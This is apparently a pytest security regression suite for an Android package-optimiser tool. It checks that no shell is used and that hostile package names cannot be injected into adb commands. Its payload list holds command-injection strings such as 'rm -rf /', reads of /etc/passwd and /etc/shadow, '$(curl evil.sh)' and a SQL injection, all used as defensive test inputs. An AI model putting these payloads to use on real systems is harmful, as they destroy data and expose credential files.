"""Security regression tests.

These exist so that the guarantees the project claims cannot silently rot:
no shell is ever used, and no untrusted string is ever interpolated into a
command.
"""

from __future__ import annotations

import ast
from pathlib import Path

import pytest

from android_optimiser.analysis.classifier import PackageClassifier
from android_optimiser.analysis.inspector import Inspector
from android_optimiser.core.adb import AdbClient, validate_package
from android_optimiser.core.transport import SubprocessTransport
from android_optimiser.domain import PackageRecord, Risk, partition_from_path
from android_optimiser.exceptions import UnsafePackageError
from android_optimiser.executor.executor import Executor
from android_optimiser.planner.planner import Planner
from android_optimiser.planner.profiles import AGGRESSIVE, HEAVY

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src" / "android_optimiser"

INJECTION_PAYLOADS = [
    "com.evil; rm -rf /",
    "com.evil && echo pwned",
    "com.evil || echo pwned",
    "com.evil | cat /etc/passwd",
    "com.evil`whoami`",
    "com.evil$(whoami)",
    "com.evil\nrm -rf /",
    "com.evil; shutdown now",
    "com.evil & echo pwned",
    "com.evil> /tmp/out",
    "com.evil< /etc/shadow",
    "$(curl evil.sh)",
    "'; DROP TABLE packages; --",
    "com.evil\x00null",
    "com.evil\ttab",
]


# --------------------------------------------------------------------------
# static guarantees
# --------------------------------------------------------------------------
def _python_files() -> list[Path]:
    return sorted(SRC.rglob("*.py"))


def test_no_shell_true_anywhere_in_the_package():
    offenders = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                for kw in node.keywords:
                    if (
                        kw.arg == "shell"
                        and isinstance(kw.value, ast.Constant)
                        and kw.value.value is True
                    ):
                        offenders.append(f"{path.name}:{node.lineno}")
    assert offenders == [], f"shell=True found at {offenders}"


def test_no_os_system_or_popen():
    offenders = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
                if node.func.attr in ("system", "popen"):
                    offenders.append(f"{path.name}:{node.lineno}")
    assert offenders == [], f"os.system/popen found at {offenders}"


def test_no_fstring_is_passed_to_subprocess():
    """An f-string argv would defeat the point of using argument vectors.

    Scoped to actual ``subprocess.*`` calls; f-strings used for formatting
    console output are irrelevant to this guarantee.
    """
    offenders = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call) or not node.args:
                continue
            func = node.func
            is_subprocess = (
                isinstance(func, ast.Attribute)
                and isinstance(func.value, ast.Name)
                and func.value.id == "subprocess"
            )
            if is_subprocess and isinstance(node.args[0], ast.JoinedStr):
                offenders.append(f"{path.name}:{node.lineno}")
    assert offenders == [], f"f-string passed to subprocess at {offenders}"


def test_transport_passes_argument_vectors():
    """The one place a process is launched must build a list, not a string."""
    source = (SRC / "core" / "transport.py").read_text(encoding="utf-8")
    tree = ast.parse(source)
    calls = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and isinstance(node.func.value, ast.Name)
        and node.func.value.id == "subprocess"
    ]
    assert calls, "expected exactly one subprocess launch site"
    for call in calls:
        assert call.args, "subprocess call must receive an argv"
        assert not isinstance(call.args[0], (ast.JoinedStr, ast.Constant)), (
            "subprocess must receive an argument vector, not a command string"
        )


def test_transport_uses_argv_lists():
    transport = SubprocessTransport()
    assert transport.binary


# --------------------------------------------------------------------------
# validation
# --------------------------------------------------------------------------
@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_validate_package_rejects_every_injection_payload(payload):
    with pytest.raises(UnsafePackageError):
        validate_package(payload)


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_classifier_refuses_every_injection_payload(payload):
    classifier = PackageClassifier()
    record = PackageRecord(
        name=payload,
        path=f"/data/app/~~x/{payload}/base.apk",
        partition=partition_from_path("/data/app/x.apk"),
        third_party=True,
        installer=None,
        enabled=True,
    )
    verdict = classifier.classify(record)
    assert verdict.risk is Risk.NEVER
    assert verdict.category == "invalid-identifier"


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_no_plan_can_contain_an_injection_payload(client, fake, payload):
    """Even if the device reports a hostile package name, no command is built."""
    fake.state["packages"].append(
        {
            "name": payload,
            "tier": "bloat",
            "root": "data",
            "path": f"/data/app/~~x/{payload}/base.apk",
            "third_party": True,
            "installer": None,
            "enabled": True,
        }
    )

    snapshot = Inspector(client).snapshot()
    for profile in (HEAVY, AGGRESSIVE):
        plan = Planner(client).plan(snapshot, profile)
        for command in plan.commands:
            assert payload not in command, command


def test_hostile_package_name_never_reaches_the_transport(client, fake):
    payload = "com.evil & echo pwned"
    fake.state["packages"].append(
        {
            "name": payload,
            "tier": "bloat",
            "root": "data",
            "path": f"/data/app/~~x/{payload}/base.apk",
            "third_party": True,
            "installer": None,
            "enabled": True,
        }
    )
    snapshot = Inspector(client).snapshot()
    plan = Planner(client).plan(snapshot, HEAVY)

    fake.calls.clear()
    Executor(client, chunk_size=8, retry_failures=False).execute(plan)

    for argv in fake.calls:
        assert "echo pwned" not in " ".join(argv)


# --------------------------------------------------------------------------
# blast radius
# --------------------------------------------------------------------------
def test_aggressive_profile_cannot_touch_protected_packages(client, fake):
    import device_state as ds

    truth = ds.ground_truth()
    protected = {n for n, safe in truth.items() if not safe}

    snapshot = Inspector(client).snapshot()
    plan = Planner(client).plan(snapshot, AGGRESSIVE)
    Executor(client, chunk_size=8, retry_failures=False).execute(plan)

    for name in protected:
        assert fake.is_enabled(name), f"{name} was disabled by the aggressive profile"


def test_settings_are_confined_to_the_global_namespace(client):
    """The tool must not write to secure/system namespaces."""
    snapshot = Inspector(client).snapshot()
    for profile in (HEAVY, AGGRESSIVE):
        for command in Planner(client).plan(snapshot, profile).commands:
            if command.startswith("settings put"):
                assert " settings put global " in f" {command} ", command
